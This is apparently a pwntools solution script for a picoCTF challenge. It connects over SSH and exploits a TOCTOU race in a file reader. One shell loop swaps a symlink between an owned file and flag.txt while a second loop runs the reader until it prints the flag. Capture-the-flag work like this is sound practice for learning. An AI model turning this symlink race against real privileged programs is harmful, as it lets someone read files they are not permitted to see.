from pwn import *

log.info("""basic issue here is a TOCTOU caused by checking permissions with stat() and then reading from
the already open ifstream. if you open a symlink to flag, but then stat a symlink to a file i own, you'll
go ahead and read my stuff. loop a symlink swap and then loop running the command to try to catch it
and eventually it'll puke up the flag.""")

session1 = ssh(host=args.HOST, port=int(args.PORT), user='ctf-player', password=args.PASSWORD)
session2 = ssh(host=args.HOST, port=int(args.PORT), user='ctf-player', password=args.PASSWORD)

session1.download_file(f"/home/ctf-player/txtreader", local=f"./txtreader")
session1.download_file(f"/home/ctf-player/src.app", local=f"./src.app")

session1.run(b"echo keepgoing > iown.txt")

sh = session1.shell()
sh2 = session2.shell()

sh.sendline(b"while true; do ln -fs iown.txt target.txt; ln -fs flag.txt target.txt; done")

sh2.sendline(b"while true; do ./txtreader target.txt; done")

while True:
    line = sh2.recvline(timeout=1)
    if not line:
        continue
    elif b"picoCTF" in line:
        log.success(line.decode('latin1'))
        exit()
